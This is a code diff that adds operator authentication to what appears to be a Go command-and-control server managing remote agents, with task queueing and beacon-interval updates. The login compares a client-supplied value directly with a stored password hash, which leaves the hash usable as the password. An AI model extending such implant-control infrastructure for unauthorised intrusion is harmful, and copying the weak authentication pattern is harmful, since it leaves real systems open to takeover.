@@ -1,6 +1,8 @@
 package main
 
 import (
+	"os"
+	"encoding/json"
 	"log"
 	"net/http"
 	"sync"
@@ -10,6 +12,14 @@ import (
 	"github.com/coder/websocket/wsjson"
 	"github.com/gin-gonic/gin"
 )
+
+
+type UserConfig struct {
+	Users []struct {
+		Username     string `json:"username"`
+		PasswordHash string `json:"password_hash"`
+	} `json:"users"`
+}
 
 //struct for single agent
 type AgentSession struct {
@@ -22,6 +32,7 @@ type AgentSession struct {
 
 }
 
+
 var (
 	clients = make(map[string]*AgentSession)
 	mu      sync.Mutex
@@ -31,6 +42,25 @@ var (
 
 
 
+//operator auth
+func authenticateUser(username, passwordHash string) bool {
+	fileData, err := os.ReadFile("users.json")
+	if err != nil {
+		return false
+	}
+
+	var config UserConfig
+	if err := json.Unmarshal(fileData, &config); err != nil {
+		return false
+	}
+
+	for _, u := range config.Users {
+		if u.Username == username && u.PasswordHash == passwordHash {
+			return true
+		}
+	}
+	return false
+}
 
 
 //cli/operator endpoint
@@ -100,6 +130,29 @@ func handleOperator(c *gin.Context) {
 	log.Println("[*] Operator connected with success!")
 	ctx := c.Request.Context()
 
+	//operator auth handling
+	var authMsg map[string]interface{}
+	err = wsjson.Read(ctx, conn, &authMsg)
+	if err != nil {
+		return
+	}
+
+	if authMsg["action"] != "auth" {
+		wsjson.Write(ctx, conn, map[string]string{"status": "error", "message": "Auth required."})
+		return
+	}
+
+	username, _ := authMsg["username"].(string)
+	passHash, _ := authMsg["password"].(string)
+
+	if !authenticateUser(username, passHash) {
+		wsjson.Write(ctx, conn, map[string]string{"status": "error", "message": "Invalid credentials."})
+		return
+	}
+
+	wsjson.Write(ctx, conn, map[string]string{"status": "success", "message": "Login success."})
+	//------
+
 	for {
 		var msg map[string]interface{}
 		err := wsjson.Read(ctx, conn, &msg)
@@ -138,6 +191,7 @@ func handleOperator(c *gin.Context) {
 				"status": "success",
 				"output": "Task successfully queued on server.",
 			})
+
 		} else if action == "list_agents" {
 			mu.Lock()
 			var agentList []string
@@ -150,6 +204,7 @@ func handleOperator(c *gin.Context) {
 				"status": "success",
 				"agents": agentList,
 			})
+
 		} else if action == "update_beacon" {
 			agentID := msg["agent_id"].(string)
 			interval := int(msg["interval"].(float64))
